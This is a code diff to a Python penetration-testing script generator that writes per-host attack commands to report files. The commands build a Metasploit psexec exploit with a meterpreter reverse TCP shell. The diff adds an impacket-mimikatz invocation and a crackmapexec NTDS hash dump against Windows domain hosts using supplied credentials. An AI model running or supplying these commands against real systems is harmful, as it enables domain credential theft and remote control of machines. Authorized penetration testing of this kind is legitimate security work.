@@ -151,6 +151,9 @@ class CreateTests:
         output += self.cme_lsa() + self.util.seperator_line()
         output += self.smb_security() + self.util.seperator_line()
         output += self.meterpreter_shell() + self.util.seperator_line()
+        output += self.gather_hashes() + self.util.seperator_line()
+        output += self.mimikatz() + self.util.seperator_line()
+
             
         self.save_results(output, './reports', str(self.host_ip) + ".txt")
 
@@ -177,9 +180,27 @@ class CreateTests:
         """
         Meterpreter Reverse Shell
         """
-        cmd = 'use exploit/windows/smb/psexec \nset PAYLOAD windows/x64/meterpreter/reverse_tcp \nset LPORT 14568 \nset SMBDomain {0} \nset SMBUser {1} \nset SMBPass {2} \nset RHOST {3} \nset RPORT 445 \nexploit'.format(self.domain, self.username, self.password, self.host_ip)
+        cmd = 'use exploit/windows/smb/psexec \nset PAYLOAD windows/x64/meterpreter/reverse_tcp \nset LPORT 14568 \nset SMBDomain {0} \nset SMBUser {1} \nset SMBPass {2} \nset RHOST {3} \nset RPORT 445 \nexploit\n'.format(self.domain, self.username, self.password, self.host_ip)
         return cmd
-        
+    
+    def mimikatz(self):
+        """
+        Mimikatz
+        """
+        cmd = 'impacket-mimikatz {0}/{1}:{2}@{3}\n'.format(self.domain,self.username,self.password,self.host_ip)
+
+        #output = self.util.execute_command(cmd)
+        return cmd
+    def gather_hashes(self):
+        """
+        Gather Hashes
+        """
+        cmd = 'crackmapexec smb {0} -u {1} -p "'"{2}"'" —ntds drsuapi -d {3}\n'.format(self.host_ip, self.username, self.password, self.domain)
+        cmd += '### cd ~/.cme/logs -- output of hash dump goes here\n'
+
+        #output = self.util.execute_command(cmd)
+        return cmd    
+    
     def save_results(self, results, folder_name, file_name):
         """
         Save to a file
@@ -247,7 +268,7 @@ if __name__ == '__main__':
 
     #if the CIDR value is valid
     if (hosts != None):
-        print("\n[i] Checking for Live Hosts...")
+        print("\n[i] Creating the script...")
         LIVE_HOSTS = []
         for host in hosts:
             scanner = HostScan(host)
@@ -267,4 +288,4 @@ if __name__ == '__main__':
         else:
             print("[!] No live hosts to scan")
 
-    print ("\n[*] Pentest Robot Finished The Execution!")
+    print ("\n[*] Finished The Script!")
